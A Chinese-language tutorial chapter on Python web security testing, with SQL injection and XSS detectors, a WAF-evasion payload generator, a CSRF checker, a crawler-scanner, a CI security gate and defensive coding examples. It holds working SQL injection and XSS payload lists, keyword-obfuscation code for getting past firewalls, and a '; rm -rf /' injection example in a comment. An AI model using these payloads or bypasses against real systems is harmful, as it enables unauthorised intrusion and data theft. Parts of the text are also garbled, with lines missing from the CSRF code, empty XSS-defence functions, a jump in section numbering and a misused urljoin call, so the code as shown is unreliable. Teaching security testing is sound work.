## 4. Web安全核心技巧

Web应用是互联网攻击面最广的目标。OWASP Top 10报告显示，注入攻击、认证缺陷、敏感数据泄露等Web漏洞常年占据安全威胁榜首。Python凭借其强大的HTTP库生态（requests、httpx、urllib3）和丰富的安全工具集成能力，成为Web安全测试的首选语言。

本节从HTTP协议基础出发，逐层讲解各类Web漏洞的检测、利用与防御编码技巧，最终组合为完整的Web安全测试框架。

### 4.1 HTTP请求基础与Session管理

#### 4.1.1 requests库的安全测试配置

所有Web安全测试的第一步是建立可控的HTTP会话。requests库提供了Session对象来持久化Cookie、设置代理、配置超时和自定义请求头。

```python
import requests
import urllib3

# 禁用SSL警告（测试环境中常需访问自签名证书的目标）
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

def create_session(proxy=None, timeout=10):
    """创建安全测试专用会话"""
    session = requests.Session()
    session.verify = False  # 测试环境跳过SSL验证
    session.timeout = timeout

    # 模拟真实浏览器的请求头，降低被WAF拦截的概率
    session.headers.update({
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) '
                       'AppleWebKit/537.36 (KHTML, like Gecko) '
                       'Chrome/120.0.0.0 Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
        'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'keep-alive',
    })

    # 配置代理（Burp Suite / mitmproxy）
    if proxy:
        session.proxies = {
            'http': proxy,
            'https': proxy,
        }

    return session
```

#### 4.1.2 请求与响应分析

安全测试需要对HTTP请求和响应进行深度分析，提取Cookie、Token、隐藏表单字段、重定向链等关键信息。

```python
from urllib.parse import urlparse, parse_qs, urlencode

def analyze_response(resp):
    """分析HTTP响应，提取安全相关信息"""
    info = {
        'status_code': resp.status_code,
        'headers': dict(resp.headers),
        'cookies': dict(resp.cookies),
        'content_length': len(resp.content),
        'content_type': resp.headers.get('Content-Type', ''),
        'redirect_chain': [r.url for r in resp.history],
        'final_url': resp.url,
        'server': resp.headers.get('Server', 'Unknown'),
        'security_headers': {},
    }

    # 检查关键安全响应头
    security_headers_to_check = [
        'X-Frame-Options',
        'X-Content-Type-Options',
        'X-XSS-Protection',
        'Content-Security-Policy',
        'Strict-Transport-Security',
        'Referrer-Policy',
        'Permissions-Policy',
    ]
    for header in security_headers_to_check:
        info['security_headers'][header] = resp.headers.get(header, 'MISSING')

    return info

def extract_forms(html_content, base_url):
    """从HTML中提取所有表单及其字段"""
    from bs4 import BeautifulSoup
    soup = BeautifulSoup(html_content, 'html.parser')
    forms = []

    for form in soup.find_all('form'):
        form_info = {
            'action': urlparse.urljoin(base_url, form.get('action', '')),
            'method': form.get('method', 'GET').upper(),
            'fields': [],
        }
        for inp in form.find_all(['input', 'textarea', 'select']):
            form_info['fields'].append({
                'name': inp.get('name', ''),
                'type': inp.get('type', 'text'),
                'value': inp.get('value', ''),
                'required': inp.has_attr('required'),
            })
        forms.append(form_info)

    return forms
```

### 4.2 SQL注入检测与利用

SQL注入是最经典的Web安全漏洞之一，攻击者通过在输入参数中插入SQL语句片段，使后端数据库执行非预期的操作。根据注入方式和响应差异，SQL注入分为多种类型。

#### 4.2.1 注入类型与检测原理

| 注入类型 | 检测原理 | 适用场景 | 难度 |
|---------|---------|---------|------|
| 基于报错 | 触发SQL语法错误，从错误信息中提取数据 | 开启错误回显的站点 | 低 |
| 基于布尔 | 通过页面内容差异判断条件真假 | 页面有明显内容变化 | 中 |
| 基于时间 | 通过SLEEP/BENCHMARK延迟判断注入成功与否 | 无明显回显差异 | 中 |
| 联合查询 | 使用UNION SELECT直接读取数据 | 已知列数的查询 | 低 |
| 堆叠查询 | 使用分号执行多条SQL语句 | 支持多语句执行的驱动 | 高 |
| 带外注入 | 通过DNS/HTTP请求外带数据 | 无回显且时间不可靠 | 高 |

```python
import time
import re

class SQLiDetector:
    """多策略SQL注入检测器"""

    # 常见SQL错误特征（覆盖MySQL、PostgreSQL、MSSQL、Oracle、SQLite）
    ERROR_PATTERNS = [
        r"SQL syntax.*?MySQL",
        r"Warning.*?mysql_",
        r"MySQLSyntaxErrorException",
        r"valid MySQL result",
        r"check the manual that corresponds to your MySQL",
        r"PostgreSQL.*?ERROR",
        r"Warning.*?pg_",
        r"valid PostgreSQL result",
        r"Npgsql\.",
        r"Driver.*?SQL[\-\_\ ]*Server",
        r"OLE DB.*?SQL Server",
        r"\bSQL Server[^&lt;&quot;]+Driver",
        r"Warning.*?mssql_",
        r"\bSQL Server[^&lt;&quot;]+[0-9a-fA-F]{8}",
        r"System\.Data\.SqlClient\.",
        r"Oracle error",
        r"Oracle.*?Driver",
        r"Warning.*?oci_",
        r"Warning.*?ora_",
        r"SQLite/JDBCDriver",
        r"SQLite\.Exception",
        r"System\.Data\.SQLite\.SQLiteException",
        r"Warning.*?sqlite_",
        r"Warning.*?SQLite3::",
        r"\[SQLITE_ERROR\]",
    ]

    def __init__(self, session=None, timeout=10):
        self.session = session or create_session()
        self.timeout = timeout
        self.error_regex = re.compile('|'.join(self.ERROR_PATTERNS), re.IGNORECASE)

    def detect_error_based(self, url, param, value):
        """基于报错的SQL注入检测"""
        test_payloads = [
            "'",
            "\"",
            "' AND 1=CONVERT(int,(SELECT @@version))--",
            "\" AND 1=CONVERT(int,(SELECT @@version))--",
            "' AND extractvalue(1,concat(0x7e,(SELECT @@version)))--",
            "' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--",
        ]

        results = []
        normal_resp = self.session.get(url, params={param: value}, timeout=self.timeout)

        for payload in test_payloads:
            try:
                resp = self.session.get(
                    url, params={param: payload}, timeout=self.timeout
                )
                # 检查是否出现SQL错误特征
                if self.error_regex.search(resp.text):
                    results.append({
                        'type': 'error-based',
                        'payload': payload,
                        'evidence': self.error_regex.search(resp.text).group(),
                        'confidence': 'high',
                    })
                # 检查状态码变化（500错误也可能暗示注入点）
                elif resp.status_code == 500 and normal_resp.status_code == 200:
                    results.append({
                        'type': 'error-based',
                        'payload': payload,
                        'evidence': f'Status changed: {normal_resp.status_code} -> {resp.status_code}',
                        'confidence': 'medium',
                    })
            except requests.RequestException:
                continue

        return results

    def detect_boolean_based(self, url, param, value):
        """基于布尔差异的SQL注入检测"""
        # True条件与False条件的payload对
        payload_pairs = [
            ("' OR '1'='1", "' OR '1'='2"),
            ("' AND '1'='1' --", "' AND '1'='2' --"),
            ("1 AND 1=1", "1 AND 1=2"),
            ("1' OR 1=1 -- -", "1' OR 1=2 -- -"),
            ("1 AND 1=1 ORDER BY 1--", "1 AND 1=2 ORDER BY 1--"),
        ]

        results = []
        normal_len = len(self.session.get(url, params={param: value}).text)

        for true_payload, false_payload in payload_pairs:
            try:
                true_resp = self.session.get(
                    url, params={param: true_payload}, timeout=self.timeout
                )
                false_resp = self.session.get(
                    url, params={param: false_payload}, timeout=self.timeout
                )

                true_len = len(true_resp.text)
                false_len = len(false_resp.text)

                # True条件应接近正常响应，False条件应有明显差异
                true_diff = abs(true_len - normal_len)
                false_diff = abs(false_len - normal_len)

                if true_diff < 50 and false_diff > 100:
                    results.append({
                        'type': 'boolean-based',
                        'true_payload': true_payload,
                        'false_payload': false_payload,
                        'true_len': true_len,
                        'false_len': false_len,
                        'confidence': 'high',
                    })
            except requests.RequestException:
                continue

        return results

    def detect_time_based(self, url, param, value, delay=5):
        """基于时间延迟的SQL注入检测"""
        # 不同数据库的时间延迟Payload
        time_payloads = [
            (f"' OR SLEEP({delay})--", 'MySQL'),
            (f"' AND SLEEP({delay})--", 'MySQL'),
            (f"'; WAITFOR DELAY '0:0:{delay}'--", 'MSSQL'),
            (f"' AND (SELECT * FROM (SELECT(SLEEP({delay})))a)--", 'MySQL'),
            (f"1; SELECT pg_sleep({delay})--", 'PostgreSQL'),
            (f"' AND DBMS_PIPE.RECEIVE_MESSAGE('a',{delay})=1--", 'Oracle'),
        ]

        results = []
        # 获取正常请求的基准时间
        start = time.time()
        self.session.get(url, params={param: value}, timeout=self.timeout * 2)
        baseline = time.time() - start

        for payload, db_type in time_payloads:
            try:
                start = time.time()
                self.session.get(url, params={param: payload}, timeout=self.timeout * 3)
                elapsed = time.time() - start

                # 响应时间超过基准+delay-1秒，说明注入生效
                if elapsed >= baseline + delay - 1:
                    results.append({
                        'type': 'time-based',
                        'payload': payload,
                        'db_type': db_type,
                        'elapsed': round(elapsed, 2),
                        'baseline': round(baseline, 2),
                        'confidence': 'high',
                    })
            except requests.Timeout:
                # 超时本身可能意味着注入成功
                results.append({
                    'type': 'time-based',
                    'payload': payload,
                    'db_type': db_type,
                    'elapsed': 'timeout',
                    'confidence': 'medium',
                })
            except requests.RequestException:
                continue

        return results

    def detect_union_based(self, url, param, value):
        """基于联合查询的SQL注入检测——先确定列数，再测试UNION"""
        results = []

        # 第一步：通过ORDER BY确定列数
        columns = None
        for i in range(1, 50):
            payload = f"' ORDER BY {i}--"
            try:
                resp = self.session.get(url, params={param: payload}, timeout=self.timeout)
                if resp.status_code == 500 or 'error' in resp.text.lower():
                    columns = i - 1
                    break
            except requests.RequestException:
                break

        if columns and columns > 0:
            # 第二步：构造UNION SELECT
            nulls = ','.join(['NULL'] * columns)
            union_payload = f"' UNION SELECT {nulls}--"
            try:
                resp = self.session.get(url, params={param: union_payload}, timeout=self.timeout)
                if resp.status_code == 200 and len(resp.text) > 0:
                    results.append({
                        'type': 'union-based',
                        'payload': union_payload,
                        'columns': columns,
                        'confidence': 'high',
                    })
            except requests.RequestException:
                pass

        return results

    def full_scan(self, url, param, value):
        """执行完整SQL注入扫描"""
        all_results = []
        all_results.extend(self.detect_error_based(url, param, value))
        all_results.extend(self.detect_boolean_based(url, param, value))
        all_results.extend(self.detect_time_based(url, param, value))
        all_results.extend(self.detect_union_based(url, param, value))
        return all_results
```

#### 4.2.2 WAF绕过技巧

Web应用防火墙（WAF）是SQL注入的主要防御手段。以下是常用的WAF绕过技术及其Python实现。

```python
import random

class WAFBypasser:
    """WAF绕过Payload生成器"""

    # 内联注释绕过（MySQL特有）
    @staticmethod
    def inline_comment(payload):
        """用内联注释分割关键字：SELECT -> SEL/**/ECT"""
        keywords = ['SELECT', 'UNION', 'FROM', 'WHERE', 'AND', 'OR',
                     'ORDER', 'GROUP', 'HAVING', 'INSERT', 'UPDATE',
                     'DELETE', 'DROP', 'TABLE', 'DATABASE']
        result = payload
        for kw in keywords:
            if kw in result.upper():
                mid = len(kw) // 2
                result = result.replace(kw, f"{kw[:mid]}/**/{kw[mid:]}")
                result = result.replace(kw.lower(), f"{kw[:mid].lower()}/**/{kw[mid:].lower()}")
        return result

    # 大小写混合绕过
    @staticmethod
    def case_mix(payload):
        """随机大小写：select -> sElEcT"""
        return ''.join(
            c.upper() if random.random() > 0.5 else c.lower()
            for c in payload
        )

    # 编码绕过
    @staticmethod
    def url_double_encode(payload):
        """双重URL编码"""
        from urllib.parse import quote
        return quote(quote(payload))

    @staticmethod
    def unicode_encode(payload):
        """Unicode编码关键字"""
        replacements = {
            'S': '\\u0053', 'E': '\\u0045', 'L': '\\u004C',
            'C': '\\u0043', 'T': '\\u0054', 'U': '\\u0055',
            'N': '\\u004E', 'I': '\\u0049', 'O': '\\u004F',
        }
        result = payload
        for char, encoded in replacements.items():
            result = result.replace(char, encoded)
        return result

    # 空格替代绕过
    @staticmethod
    def space_alternatives(payload):
        """用替代字符替换空格"""
        alternatives = [
            '/**/',     # 内联注释
            '%09',      # 水平制表符
            '%0a',      # 换行符
            '%0b',      # 垂直制表符
            '%0c',      # 换页符
            '%0d',      # 回车符
            '%a0',      # 不间断空格（某些环境下有效）
        ]
        sep = random.choice(alternatives)
        return payload.replace(' ', sep)

    # 等号替代绕过
    @staticmethod
    def equal_alternatives(payload):
        """用LIKE、BETWEEN、REGEXP等替代等号"""
        alternatives = [
            ('=1', ' LIKE 1'),
            ('=1', ' BETWEEN 1 AND 1'),
            ('=1', ' REGEXP 1'),
            ('=1', ' IN (1)'),
        ]
        result = payload
        for old, new in alternatives:
            if old in result:
                result = result.replace(old, new, 1)
                break
        return result

    def generate_variants(self, base_payload):
        """生成多种绕过变体"""
        variants = [base_payload]
        variants.append(self.inline_comment(base_payload))
        variants.append(self.case_mix(base_payload))
        variants.append(self.space_alternatives(base_payload))
        variants.append(self.equal_alternatives(base_payload))
        variants.append(self.url_double_encode(base_payload))
        # 组合技：内联注释+大小写
        variants.append(self.inline_comment(self.case_mix(base_payload)))
        # 组合技：空格替代+大小写
        variants.append(self.space_alternatives(self.case_mix(base_payload)))
        return variants
```

### 4.3 XSS检测与利用

跨站脚本攻击（XSS）允许攻击者在受害者浏览器中执行恶意JavaScript代码。XSS分为反射型、存储型和DOM型三种。

#### 4.3.1 三种XSS类型对比

| 特征 | 反射型XSS | 存储型XSS | DOM型XSS |
|------|----------|----------|---------|
| 载荷位置 | URL参数 | 服务器数据库 | 客户端DOM |
| 触发方式 | 点击恶意链接 | 访问包含载荷的页面 | 前端JS处理输入 |
| 持久性 | 非持久 | 持久 | 非持久 |
| 服务端参与 | 原样反射 | 存储后再输出 | 不经过服务端 |
| 检测难度 | 低 | 中 | 高 |
| 危害等级 | 中 | 高 | 中-高 |

#### 4.3.2 XSS检测引擎

```python
import html
import re
from urllib.parse import urljoin, urlparse, parse_qs, urlencode, urlunparse

class XSSDetector:
    """多类型XSS检测器"""

    # 通用XSS测试载荷——覆盖不同上下文和过滤绕过
    REFLECTED_PAYLOADS = [
        # 基础标签注入
        '<script>alert("XSS")</script>',
        '<img src=x onerror=alert("XSS")>',
        '<svg onload=alert("XSS")>',
        '<body onload=alert("XSS")>',
        '<iframe src="javascript:alert(\'XSS\')">',
        # 属性值逃逸
        '"><script>alert("XSS")</script>',
        "'-alert('XSS')-'",
        '\\";alert("XSS");//',
        # 事件处理器
        '" onmouseover="alert(\'XSS\')"',
        "' onfocus='alert(\"XSS\")' autofocus='",
        # 编码绕过
        '<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#34;&#88;&#83;&#83;&#34;&#41;>',
        '"><img src=x onerror=alert&#40;1&#41;>',
        # JavaScript协议
        'javascript:alert("XSS")',
        'data:text/html,<script>alert("XSS")</script>',
        # 模板注入混淆
        '{{constructor.constructor("alert(1)")()}}',
        '${alert(1)}',
        # 无引号上下文
        '<details open ontoggle=alert("XSS")>',
        '<marquee onstart=alert("XSS")>',
        '<video><source onerror=alert("XSS")>',
        '<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert("XSS")>',
    ]

    # 用于验证存储型XSS的唯一标记
    STORED_MARKER = "xss_test_{timestamp}"

    def __init__(self, session=None):
        self.session = session or create_session()

    def detect_reflected(self, url, param):
        """检测反射型XSS"""
        findings = []
        # 先获取正常响应用于对比
        normal_resp = self.session.get(url, params={param: 'harmless_test_value'})

        for payload in self.REFLECTED_PAYLOADS:
            try:
                resp = self.session.get(url, params={param: payload}, timeout=10)

                # 检查1：Payload原样出现在响应中（未转义/未过滤）
                if payload in resp.text:
                    # 进一步确认是否在HTML上下文中（而非纯文本展示）
                    context = self._identify_context(resp.text, payload)
                    findings.append({
                        'type': 'reflected-xss',
                        'payload': payload,
                        'url': resp.url,
                        'context': context,
                        'severity': 'high' if context in ('html', 'attribute', 'script') else 'medium',
                    })

                # 检查2：部分反射（某些字符被过滤但仍有注入点）
                elif self._check_partial_reflection(resp.text, payload):
                    findings.append({
                        'type': 'reflected-xss-partial',
                        'payload': payload,
                        'url': resp.url,
                        'note': 'Partial reflection detected, filtering may be bypassable',
                        'severity': 'medium',
                    })

            except requests.RequestException:
                continue

        return findings

    def detect_stored(self, submit_url, verify_url, param, form_data=None):
        """检测存储型XSS"""
        findings = []
        marker = f"xss_test_{int(time.time())}"

        for payload in self.REFLECTED_PAYLOADS:
            stored_payload = f"{marker}{payload}"
            data = form_data or {}
            data[param] = stored_payload

            try:
                # 步骤1：提交Payload
                self.session.post(submit_url, data=data, timeout=10)
                time.sleep(1)  # 等待数据存储

                # 步骤2：访问验证页面
                verify_resp = self.session.get(verify_url, timeout=10)

                # 步骤3：检查Payload是否出现在验证页面中
                if payload in verify_resp.text:
                    findings.append({
                        'type': 'stored-xss',
                        'payload': payload,
                        'submit_url': submit_url,
                        'verify_url': verify_url,
                        'severity': 'critical',
                    })

            except requests.RequestException:
                continue

        return findings

    def detect_dom_xss(self, html_content, url):
        """检测DOM型XSS——分析客户端JavaScript中的危险Sink"""
        findings = []

        # 危险的DOM操作（Sink）
        dangerous_sinks = [
            (r'document\.write\s*\(', 'document.write'),
            (r'document\.writeln\s*\(', 'document.writeln'),
            (r'\.innerHTML\s*=', 'innerHTML assignment'),
            (r'\.outerHTML\s*=', 'outerHTML assignment'),
            (r'\.insertAdjacentHTML\s*\(', 'insertAdjacentHTML'),
            (r'eval\s*\(', 'eval()'),
            (r'setTimeout\s*\([\'"]', 'setTimeout with string'),
            (r'setInterval\s*\([\'"]', 'setInterval with string'),
            (r'new\s+Function\s*\(', 'Function constructor'),
            (r'\.src\s*=', 'src assignment'),
            (r'location\s*=', 'location assignment'),
            (r'location\.href\s*=', 'location.href assignment'),
        ]

        # 可控的数据源（Source）
        dangerous_sources = [
            (r'document\.URL', 'document.URL'),
            (r'document\.documentURI', 'document.documentURI'),
            (r'document\.referrer', 'document.referrer'),
            (r'location\.search', 'location.search'),
            (r'location\.hash', 'location.hash'),
            (r'location\.href', 'location.href'),
            (r'window\.name', 'window.name'),
            (r'document\.cookie', 'document.cookie'),
        ]

        for pattern, sink_name in dangerous_sinks:
            matches = re.findall(pattern, html_content)
            if matches:
                for src_pattern, src_name in dangerous_sources:
                    if re.search(src_pattern, html_content):
                        findings.append({
                            'type': 'dom-xss',
                            'sink': sink_name,
                            'source': src_name,
                            'url': url,
                            'severity': 'high',
                            'note': f'DOM sink "{sink_name}" receives data from source "{src_name}"',
                        })

        return findings

    def _identify_context(self, html_content, payload):
        """识别Payload在HTML中的注入上下文"""
        idx = html_content.find(payload)
        if idx == -1:
            return 'unknown'

        # 检查前面的字符，判断注入位置
        before = html_content[max(0, idx - 100):idx]
        if re.search(r'<script[^>]*>', before):
            return 'script'
        elif re.search(r'=["\'][^"\']*$', before):
            return 'attribute'
        elif re.search(r'<[^>]+$', before):
            return 'tag'
        else:
            return 'html'

    def _check_partial_reflection(self, html_content, payload):
        """检查是否发生部分反射（某些关键字被过滤但注入点仍存在）"""
        # 提取payload中的关键标记
        markers = ['alert', 'onerror', 'onload', 'script', 'javascript']
        reflected_count = sum(1 for m in markers if m in payload and m in html_content)
        return reflected_count >= 2
```

### 4.8 CSRF检测

跨站请求伪造（CSRF）利用用户已认证的会话，诱使其在不知情的情况下执行非预期的操作。

```python
class CSRFDetector:
    """CSRF漏洞检测器"""

    def __init__(self, session=None):
        self.session = session or create_session()

    def detect(self, url, form_data=None):
        """检测CSRF漏洞"""
        findings = []
        resp = self.session.get(url)
        soup = BeautifulSoup(resp.text, 'html.parser')

        for form in soup.find_all('form'):
            form_action = form.get('action', '')
            form_method = form.get('method', 'GET').upper()

                continue

                name = (inp.get('name', '') + inp.get('id', '')).lower()
                if any(csrf_name in name for csrf_name in csrf_field_names):
                    has_csrf_token = True
                    break

            # 检查Referer/Origin验证
            has_referer_check = False  # 需要在实际请求中验证

            if not has_csrf_token:
                findings.append({
                    'type': 'csrf-missing-token',
                    'action': form_action,
                    'method': form_method,
                    'fields': [inp.get('name', '') for inp in inputs],
                    'severity': 'medium',
                    'note': 'No CSRF token found in form',
                })

        # 检查CSRF Token的可预测性
        token_predictability = self._check_token_predictability(url)
        if token_predictability:
            findings.append(token_predictability)

        return findings

    def _check_token_predictability(self, url):
        """检查CSRF Token的可预测性"""
        tokens = set()
        for _ in range(5):
            resp = self.session.get(url)
            soup = BeautifulSoup(resp.text, 'html.parser')
            for inp in soup.find_all('input', type='hidden'):
                name = (inp.get('name', '') + inp.get('id', '')).lower()
                if 'token' in name or 'csrf' in name:
                    tokens.add(inp.get('value', ''))

        if len(tokens) > 0 and len(tokens) < 3 and len(list(tokens)[0]) < 10:
            return {
                'type': 'csrf-weak-token',
                'sample_tokens': list(tokens)[:3],
                'severity': 'high',
```

```python
                self.logger.info(f"[CRAWL] {url} ({resp.status_code})")

                soup = BeautifulSoup(resp.text, 'html.parser')
                for link in soup.find_all('a', href=True):
                    href = urljoin(url, link['href'])
                    parsed = urlparse(href)
                    # 只爬取同域链接，排除锚点和外部链接
                    if (parsed.netloc == urlparse(self.target).netloc and
                        href not in visited and
                        '#' not in href):
                        to_visit.append(href)

                # 提取所有带参数的链接
                parsed = urlparse(url)
                if parsed.query:
                    self.crawled_urls.add(url)

            except requests.RequestException as e:
                self.logger.debug(f"[CRAWL-ERR] {url}: {e}")
                continue

        return list(visited)

    def scan(self, max_pages=50):
        """执行完整扫描"""
        self.logger.info(f"[*] Starting scan of {self.target}")
        start_time = datetime.now()

        # 阶段1：爬取
        self.logger.info("[Phase 1] Crawling target...")
        pages = self.crawl(max_pages)
        self.logger.info(f"[Phase 1] Discovered {len(pages)} pages, "
                          f"{len(self.crawled_urls)} with parameters")

        # 阶段2：漏洞扫描
        self.logger.info("[Phase 2] Scanning for vulnerabilities...")
        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = []
            for url in self.crawled_urls:
                parsed = urlparse(url)
                params = parse_qs(parsed.query)
                for param in params:
                    value = params[param][0]
                    # 提交各类型的检测任务
                    futures.append(executor.submit(
                        self.sqli_detector.full_scan, url, param, value
                    ))
                    futures.append(executor.submit(
                        self.xss_detector.detect_reflected, url, param
                    ))
                    futures.append(executor.submit(
                        self.cmdi_detector.detect_output_based, url, param, value
                    ))
                    futures.append(executor.submit(
                        self.lfi_detector.detect_lfi, url, param
                    ))

            for future in as_completed(futures):
                try:
                    result = future.result()
                    if result:
                        self.findings.extend(result if isinstance(result, list) else [result])
                except Exception as e:
                    self.logger.debug(f"[SCAN-ERR] {e}")

        # 阶段3：通用检测（不依赖URL参数）
        self.logger.info("[Phase 3] Running general checks...")
        for page in pages[:10]:  # 只对前10个页面做CSRF和Session检测
            try:
                csrf_results = self.csrf_detector.detect(page)
                self.findings.extend(csrf_results)
                session_results = self.auth_tester.test_session_security(page)
                self.findings.extend(session_results)
            except Exception:
                continue

        elapsed = (datetime.now() - start_time).total_seconds()
        self.logger.info(f"[*] Scan complete in {elapsed:.1f}s. "
                          f"Found {len(self.findings)} issues.")
        return self.findings

    def generate_report(self, output_path=None):
        """生成扫描报告"""
        report = {
            'target': self.target,
            'scan_time': datetime.now().isoformat(),
            'total_findings': len(self.findings),
            'by_severity': {},
            'findings': self.findings,
        }

        # 按严重程度统计
        for finding in self.findings:
            sev = finding.get('severity', 'unknown')
            report['by_severity'][sev] = report['by_severity'].get(sev, 0) + 1

        if output_path:
            with open(output_path, 'w', encoding='utf-8') as f:
                json.dump(report, f, indent=2, ensure_ascii=False)
            self.logger.info(f"[+] Report saved to {output_path}")

        return report

    def print_summary(self):
        """打印扫描摘要"""
        print("\n" + "=" * 60)
        print(f"  Web Vulnerability Scan Report")
        print(f"  Target: {self.target}")
        print("=" * 60)

        severity_order = ['critical', 'high', 'medium', 'low', 'info']
        for sev in severity_order:
            count = sum(1 for f in self.findings if f.get('severity') == sev)
            if count > 0:
                bar = '█' * min(count, 30)
                print(f"  {sev.upper():>10s}: {count:3d} {bar}")

        print("-" * 60)
        print(f"  Total: {len(self.findings)} findings")
        print("=" * 60)

        # 详细列出高危和严重漏洞
        critical_findings = [f for f in self.findings
                              if f.get('severity') in ('critical', 'high')]
        if critical_findings:
            print("\n[!] Critical & High Findings:\n")
            for i, f in enumerate(critical_findings, 1):
                print(f"  {i}. [{f.get('severity', '?').upper()}] {f.get('type', '?')}")
                if 'payload' in f:
                    print(f"     Payload: {f['payload']}")
                if 'evidence' in f:
                    print(f"     Evidence: {f['evidence']}")
                if 'note' in f:
                    print(f"     Note: {f['note']}")
                print()
```

### 4.10 安全编码实践：防御端

安全测试的另一面是防御。作为开发者，必须知道如何正确防御这些漏洞。

#### 4.10.1 参数化查询防御SQL注入

```python
import sqlite3

# ❌ 错误做法：字符串拼接（存在SQL注入）
def unsafe_query(username):
    conn = sqlite3.connect('app.db')
    cursor = conn.cursor()
    query = f"SELECT * FROM users WHERE username = '{username}'"
    cursor.execute(query)  # 危险！用户输入直接拼入SQL
    return cursor.fetchall()

# ✅ 正确做法：参数化查询
def safe_query(username):
    conn = sqlite3.connect('app.db')
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM users WHERE username = ?", (username,))
    return cursor.fetchall()

# ✅ ORM方式（SQLAlchemy示例）
from sqlalchemy import create_engine, text
from sqlalchemy.orm import Session

def safe_orm_query(engine, username):
    with Session(engine) as session:
        result = session.execute(
            text("SELECT * FROM users WHERE username = :username"),
            {"username": username}
        )
        return result.fetchall()
```

#### 4.10.2 输出编码防御XSS

```python
import html
from markupsafe import escape

# ❌ 错误做法：直接输出用户输入
def unsafe_render(user_input):

# ✅ 正确做法：HTML实体编码
```

#### 4.10.3 命令注入防御

```python
import subprocess
import shlex
import os

# ❌ 错误做法：os.system拼接
def unsafe_ping(host):
    os.system(f"ping -c 1 {host}")  # host="; rm -rf /"

# ❌ 错误做法：subprocess.shell=True
def unsafe_ping_v2(host):
    subprocess.run(f"ping -c 1 {host}", shell=True)

# ✅ 正确做法：使用列表参数，禁止shell解释
def safe_ping(host):
    # 白名单验证：只允许合法的主机名或IP
    import re
    if not re.match(r'^[a-zA-Z0-9.\-]+$', host):
        raise ValueError(f"Invalid hostname: {host}")
    result = subprocess.run(
        ['ping', '-c', '1', host],
        capture_output=True, text=True, timeout=10
    )
    return result.stdout

# ✅ 正确做法：使用shlex.quote处理无法白名单验证的场景
def safe_command(user_input):
    safe_arg = shlex.quote(user_input)
    result = subprocess.run(
        f"echo {safe_arg}", shell=True, capture_output=True, text=True
    )
    return result.stdout
```

#### 4.10.4 SSRF防御

```python
import ipaddress
import socket
from urllib.parse import urlparse

def is_safe_url(url, allowed_schemes=None):
    """验证URL是否安全（防SSRF）"""
    if allowed_schemes is None:
        allowed_schemes = ['http', 'https']

    parsed = urlparse(url)

    # 1. 检查协议
    if parsed.scheme not in allowed_schemes:
        return False, f"Blocked scheme: {parsed.scheme}"

    # 2. 解析域名到IP
    hostname = parsed.hostname
    if not hostname:
        return False, "No hostname"

    try:
        ip = socket.gethostbyname(hostname)
    except socket.gaierror:
        return False, f"Cannot resolve: {hostname}"

    # 3. 检查是否为内网地址
    ip_obj = ipaddress.ip_address(ip)
    if ip_obj.is_private or ip_obj.is_loopback or ip_obj.is_link_local:
        return False, f"Private/loopback IP: {ip}"

    # 4. 检查云元数据地址
    cloud_ranges = [
        ipaddress.ip_network('169.254.169.254/32'),  # AWS/GCP/Azure
        ipaddress.ip_network('100.100.100.200/32'),   # 阿里云
    ]
    for cloud_range in cloud_ranges:
        if ip_obj in cloud_range:
            return False, f"Cloud metadata IP: {ip}"

    # 5. 检查是否解析到IPv6环回
    if ip_obj.version == 6 and ip_obj.is_loopback:
        return False, f"IPv6 loopback: {ip}"

    return True, "OK"
```

### 4.11 常见误区与纠正

| 误区 | 正确做法 |
|------|---------|
| 只用一种Payload测试SQL注入 | 组合使用报错/布尔/时间/联合查询多种策略 |
| XSS检测只看`<script>`标签 | 还需检查事件处理器、SVG、data URI等上下文 |
| 忽略编码层面的绕过 | 双重URL编码、Unicode编码、HTML实体编码都需覆盖 |
| 认为HTTPS就安全 | HTTPS只加密传输层，不防应用层漏洞 |
| 不检查安全响应头 | CSP、HSTS、X-Frame-Options等是重要的纵深防御 |
| 文件上传只检查扩展名 | 需同时验证MIME类型、文件内容（Magic Bytes）、重命名存储 |
| 信任客户端验证 | 所有客户端验证都可绕过，服务端必须独立验证 |
| 不做输出编码 | 数据进入HTML/JS/URL/CSS任何上下文前都需对应编码 |
| Session ID放在URL参数中 | Session ID必须通过Cookie传输并设置HttpOnly/Secure |
| 忘记测试子域名和端口 | 内网服务、管理后台往往在非标准端口上 |

#### 4.12.1 与专业工具集成

Python安全测试的价值在于可以编排专业工具形成自动化流水线：

```python
import subprocess
import xml.etree.ElementTree as ET

def run_nikto(target, output_file='/tmp/nikto.xml'):
    """调用Nikto Web扫描器"""
    cmd = ['nikto', '-h', target, '-Format', 'xml', '-output', output_file]
    subprocess.run(cmd, capture_output=True, timeout=600)
    # 解析Nikto XML报告
    tree = ET.parse(output_file)
    root = tree.getroot()
    findings = []
    for item in root.findall('.//item'):
        findings.append({
            'description': item.findtext('description', ''),
            'method': item.findtext('method', ''),
            'url': item.findtext('url', ''),
        })
    return findings

def run_sqlmap(target_url, param, level=1, risk=1):
    """调用sqlmap进行自动化SQL注入利用"""
    cmd = [
        'sqlmap', '-u', target_url,
        '-p', param,
        '--level', str(level),
        '--risk', str(risk),
        '--batch',           # 非交互模式
        '--output-dir=/tmp/sqlmap_output',
    ]
    result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
    return result.stdout
```

#### 4.12.2 自动化CI/CD安全扫描

```python
def security_gate(target, max_critical=0, max_high=2):
    """安全门禁：如果超过阈值则阻止部署"""
    scanner = WebVulnScanner(target, threads=3)
    scanner.scan(max_pages=20)
    report = scanner.generate_report()

    critical = report['by_severity'].get('critical', 0)
    high = report['by_severity'].get('high', 0)

    print(f"Security Scan: {critical} critical, {high} high issues")

    if critical > max_critical or high > max_high:
        print("❌ SECURITY GATE FAILED — deployment blocked")
        scanner.print_summary()
        return False

    print("✅ Security gate passed")
    return True
```
